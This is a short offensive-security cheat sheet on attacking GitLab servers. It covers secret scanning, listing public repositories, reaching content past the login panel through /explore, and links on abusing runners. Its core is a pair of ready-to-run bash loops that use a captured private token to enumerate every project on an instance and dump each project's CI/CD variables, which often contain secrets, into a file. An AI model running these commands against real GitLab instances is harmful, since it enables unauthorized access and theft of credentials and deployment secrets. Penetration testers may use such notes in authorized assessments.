---
description: Gitlab checks
---

# Gitlab

### Search for secrets

{% embed url="https://github.com/praetorian-inc/noseyparker" %}

```bash
#Scan repo
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan .
#Get results
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report
```

### Reconnaissance

{% embed url="https://embracethered.com/blog/posts/2022/hacking-gitlab-servers/" %}

### Check public repositories

```bash
curl "https://gitlab.com/api/v4/projects?visibility=public" | jq '.[] | {name, path, web_url}'
```

**Route `/explore` allow to go behind the login panel**

### Abusing GitLab token

#### Get variables from projects

define count pages and replace max page in seq. First take all projects id

```bash
for page in $(seq 0 110); do echo $page && curl -s --header "PRIVATE-TOKEN: <token>" "https://gitlab.example.com/api/v4/projects?per_page=100&page=$page" | jq ".[].id" >> gitlab-ids.txt; done
```

Then try get var

```bash
while IFS='' read -r LINE || [ -n "${LINE}" ]; do url="https://gitlab.example.com/api/v4/projects/$LINE"; vars=$(curl -s --header 'PRIVATE-TOKEN: token' $url/variables); [ ${#vars} -gt 5 ] && echo $vars > .tempvars && curl -s --header 'PRIVATE-TOKEN: token' $url | jq --slurpfile v .tempvars '{id: .id, git: .http_url_to_repo, vars: $v[0]}' >> gitlab-vars.txt; done <gitlab-ids.txt
```

Also try get gitlab-group vars (мне пока лень)

### Abusing GitLab Runners

{% embed url="https://frichetten.com/blog/abusing-gitlab-runners/" %}

Script for steal tasks by requesting them faster than a real runner - [https://github.com/Frichetten/gitlab-runner-research](https://github.com/Frichetten/gitlab-runner-research)
